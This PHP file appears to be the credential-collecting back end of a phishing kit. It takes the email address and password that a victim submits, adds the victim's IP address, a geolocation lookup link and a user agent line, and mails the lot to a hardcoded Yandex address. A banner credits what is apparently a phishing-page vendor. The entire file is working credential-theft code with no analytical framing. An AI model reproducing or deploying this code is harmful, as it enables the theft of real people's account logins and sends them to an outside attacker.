<?php
if(isset($_SERVER['HTTP_X_REAL_IP'])){
$ip = $_SERVER['HTTP_X_REAL_IP'];
}else{
$ip=$_SERVER['REMOTE_ADDR'];
}
$message .= "|----------| E M A I L  |--------------|\n";
$message .= "Online: ".$_POST['email']."\n";
$message .= "pass: ".$_POST['pwd']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- FUDPAGES [.] RU --------------|\n";
$send = "yeancah@yandex.com,yeancah@yandex.com";
$subject = "$country | $ip";
{
mail("$send", "$subject", $message);   
}


?>